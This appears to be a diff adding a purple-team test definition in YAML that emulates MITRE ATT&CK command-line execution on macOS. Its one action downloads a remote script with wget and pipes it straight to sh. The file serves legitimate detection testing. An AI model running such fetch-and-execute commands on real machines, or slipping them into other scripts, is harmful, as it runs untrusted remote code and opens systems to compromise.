@@ -1,0 +1,16 @@
+enabled: true
+meta:
+  author: cg 
+  created: 2017-11-28
+  decorations:
+  - Purple Team
+  description: Execute a remote script - DL & execute with wget
+  link: https://attackerkb.com/Unix/LinuxUnixBSD_Post_Exploitation
+  mitre_link: https://attack.mitre.org/wiki/Technique/T1059
+  mitre_attack_phase: Execution
+  mitre_attack_technique: Command-Line Interface
+  purple_actions:
+    1: wget http://server/file.sh -O- | sh
+os: osx
+name: Execute a remote script - DL & execute with wget
+uuid: c36cfb13-0859-407b-b9ea-19120723c336
